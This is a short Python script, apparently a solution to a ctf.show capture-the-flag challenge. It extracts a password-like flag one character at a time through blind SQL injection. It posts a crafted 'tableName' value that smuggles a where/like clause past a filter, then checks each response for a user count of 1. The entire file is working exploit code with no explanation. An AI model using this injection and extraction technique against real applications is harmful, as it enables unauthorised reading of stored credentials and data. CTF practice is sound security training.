import requests
url = "http://5c27f4aa-e60a-4741-b1ff-96a778393b74.challenge.ctf.show/select-waf.php"
str = "0123456789abcdef{}-_"
flag = "ctfshow"
for i in range(0,60):
    for j in str:
        data = {"tableName":f"(ctfshow_user)where(pass)like'{flag+j}%'"}
        r = requests.post(url=url, data=data).text
        if "$user_count = 1" in r:
            flag += j
            print(flag)
            if j=="}":
                exit()
            break